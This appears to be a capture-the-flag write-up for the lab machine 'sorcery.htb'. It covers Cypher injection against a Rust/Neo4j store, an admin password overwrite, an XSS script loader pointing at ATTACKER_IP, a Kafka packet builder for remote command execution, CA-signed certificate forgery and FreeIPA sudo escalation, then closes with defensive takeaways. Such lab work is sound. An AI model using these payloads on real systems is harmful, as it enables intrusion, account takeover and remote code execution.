Cypher Injection & Admin Takeover

04
Vulnerability Discovery — Cypher Injection
Neo4j Injection · Phase 04

Examining the backend Rust macros (backend-macros/src/lib.rs), the Model derive macro auto-generates get_by_* functions that build Cypher queries via string interpolation — without sanitising input. The product detail endpoint at /dashboard/store/<id> passes the URL path parameter directly to Product::get_by_id().

rust
// Vulnerable macro-generated query builder (backend-macros/src/lib.rs)
let query_string = format!(
    r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
    struct_name, name_string, name  // <-- unsanitized user input!
);
✕
Root Cause: Rust's format!() macro is used to construct Cypher queries by interpolating raw user input, equivalent to SQL string concatenation. No parameterised query API is used, allowing full injection of Cypher clauses including write operations via WITH chaining.
05
Payload 1 — Leaking the Registration Key
Data Exfiltration via Injection · Phase 05

Register a basic user account and obtain a valid product ID from the store. Inject into the product URL to leak the registration_key from the Config node by hijacking the description field of the returned object via OPTIONAL MATCH and coalesce().

cypher injection
# Injection payload (URL-decoded for readability):
"}) OPTIONAL MATCH (c:Config) RETURN result { .*, description: coalesce(c.registration_key, result.description) }//

# URL-encoded injection (appended to product UUID in the path):
%22%7D%29%20OPTIONAL%20MATCH%20%28c%3AConfig%29%20RETURN%20result%20%7B%20.%2A%2C%20description%3A%20coalesce%28c.registration_key%2C%20result.description%29%20%7D%2F%2F
✓
Registration Key Leaked: dd05d743-b560-45dc-9a09-43ab18c7a513 — appeared in the product description field of the API response. Re-registering with this key grants Seller/Vendor access.
06
Payload 2 — Admin Password Overwrite
Write-via-Injection · Phase 06

The WITH keyword in Cypher allows chaining a write operation (SET) after the initial read. First generate an Argon2id hash for our chosen password, then inject it into the admin user node via the same product endpoint.

python
# Generate Argon2id hash for the new admin password
import argon2
ph = argon2.PasswordHasher(time_cost=2, memory_cost=19456, parallelism=1)
print(ph.hash("P@ssw0rd123"))
cypher injection
# Injection payload using WITH to chain a SET write:
"}) WITH result MATCH (u:User {username: 'admin'}) SET u.password = '$argon2id$v=19$m=19456,t=2,p=1$...' RETURN result { .*, description: 'admin password updated' } //
✓
Admin Credentials Set: username: admin / password: P@ssw0rd123 — Cypher injection successfully executed a SET write operation, overwriting the admin password hash in Neo4j.

WebAuthn Bypass & Kafka RCE

07
Obtaining Admin+Passkey Token via XSS Relay
WebAuthn Virtual Authenticator · Phase 07

The debug panel at /dashboard/debug requires both admin privileges AND a passkey-authenticated session (withPasskey: true). Admin login alone only provides withPasskey: false. The headless Chrome bot visits newly created product pages as admin — its token has withPasskey: true but is restricted via onlyForPaths. The exploit chain uses XSS in a product description to hijack the bot's session and perform a full WebAuthn passkey registration + authentication relay, capturing an unrestricted admin+passkey token.

html — xss payload
<!-- Injected into product description via dangerouslySetInnerHTML -->
<img src=x onerror="var s=document.createElement('script');s.src='http://ATTACKER_IP:9999/stage1.js';document.body.appendChild(s);">

08
Kafka RCE via Debug Panel TCP Proxy
Remote Code Execution · Phase 08

The debug panel's sendPortData function acts as a raw TCP proxy to any internal host:port. The DNS container runs a Kafka consumer that executes each received message as a direct bash -c <message> call. By crafting a valid Kafka v0 Produce request and sending it to kafka:9092, arbitrary commands execute inside the Docker network.

python — kafka packet builder
import struct, zlib

def kafka_pkt(cmd_str):
    topic = b"update"
    v = cmd_str.encode()
    mb = struct.pack(">BBi", 0, 0, -1) + struct.pack(">i", len(v)) + v
    crc = zlib.crc32(mb) & 0xffffffff
    msg = struct.pack(">I", crc) + mb
    ms  = struct.pack(">q", 0) + struct.pack(">i", len(msg)) + msg
    pd  = struct.pack(">i", 0) + struct.pack(">i", len(ms)) + ms
    td  = struct.pack(">h", len(topic)) + topic + struct.pack(">i", 1) + pd
    bd  = struct.pack(">h", 1) + struct.pack(">i", 10000) + struct.pack(">i", 1) + td
    hd  = struct.pack(">hhih", 0, 0, 42, 3) + b"dbg"
    return struct.pack(">i", len(hd) + len(bd)) + hd + bd

# Send via sendPortData to kafka:9092
pkt = kafka_pkt("echo '10.10.14.76 think.sorcery.htb' > /dns/hosts-user && kill -HUP $(pgrep dnsmasq) && /dns/convert.sh").hex()

requests.post('https://sorcery.htb/dashboard/debug',
    headers={'Content-Type':'text/plain;charset=UTF-8',
             'Next-Action':'99cc053db6c8902cbccf05efda80ea0306624c56'},
    data=json.dumps(['kafka', 9092, [pkt], False, False]),
    cookies={'token': admin_passkey_token}, verify=False)
✕
Critical Design Flaw: The Kafka consumer executes message payloads directly as shell commands with no input validation. Never send SIGKILL to dnsmasq — use kill -HUP (SIGHUP) to reload configuration. Killing the process triggers supervisord's fatal exit handler and crashes the entire DNS container.

10
Forging a Trusted TLS Certificate
Internal PKI Abuse · Phase 10

The internal Root CA certificate and key are retrievable from the FTP server (accessible via Cypher injection's LOAD CSV FROM 'ftp://ftp/pub/' or through a SOCKS tunnel via chisel/proxychains). Use the internal CA to sign a certificate for think.sorcery.htb that the mail bot's browser will trust.

bash
# Decrypt the CA private key (password: password)
openssl rsa -in RootCA.key -out RootCA.unenc.key

# Generate our server key and CSR
openssl genrsa -out think.sorcery.htb.key 2048
openssl req -new -key think.sorcery.htb.key -out think.sorcery.htb.csr \
  -subj "/CN=think.sorcery.htb"

# Sign with the internal Root CA
openssl x509 -req -in think.sorcery.htb.csr -CA RootCA.crt \
  -CAkey RootCA.unenc.key -CAcreateserial \
  -out think.sorcery.htb.crt -days 365

# Bundle for mitmproxy
cat think.sorcery.htb.key think.sorcery.htb.crt RootCA.crt > think.sorcery.htb.pem

IPA Group & Sudo Rule Abuse · Phase 16

SSH as ash_winter — the account password has expired, set a new one when prompted. With access to the ipa CLI, ash_winter can add themselves to the sysadmins group and an existing sudo rule, granting unrestricted root access after SSSD policy refresh.

bash

✕
Critical Misconfiguration: FreeIPA sudo rules and group memberships are user-modifiable by privileged IPA accounts without additional approval workflows. An attacker with any IPA user account that has modify rights can self-escalate to root on all SSSD-joined hosts.

key takeaways
// 01
Parameterise All Database Queries
Using Rust's format!() to build Cypher queries is equivalent to SQL string concatenation — a textbook injection vulnerability. Even macro-generated code must use the Neo4j driver's parameterised query API, where input is always treated as data and never as query syntax.
// 02
WebAuthn Does Not Guarantee Server-Side Trust
Server-side WebAuthn validation only verifies cryptographic signatures against registered public keys. If an attacker can trigger registration and authentication flows with virtual FIDO2 credentials (via XSS relay), they bypass WebAuthn entirely without any physical authenticator device.
// 03
Message Queues Are Not Command Interpreters
A Kafka consumer that passes message payloads directly to bash -c is an RCE vulnerability masquerading as a feature. All message-driven automation must validate, whitelist, and sanitise payloads before execution, treating them as untrusted input regardless of the transport layer.
// 04
Privilege Separation Across Sudo Primitives
Granting strace on arbitrary PIDs as another user is equivalent to granting read access to that user's process memory. Combined with a spawnable process, this always leads to credential extraction. Sudo rules must be scoped to the minimum necessary operation with no composition paths.
// 05
Never Pass Secrets as CLI Arguments
Command-line arguments are globally visible to all local users through /proc/[pid]/cmdline and tools like ps. Secrets must be passed via environment variables, configuration files with restricted permissions, or dedicated secrets management APIs — never inline in a command invocation.
// 06
FreeIPA Delegation Requires Approval Workflows
Allowing users to self-modify IPA group memberships and sudo rules without a second-factor approval chain gives any compromised IPA account a direct path to root on all SSSD-joined systems. Privileged IPA operations must require multi-party approval, logging, and access reviews to prevent lateral movement and privilege escalation.
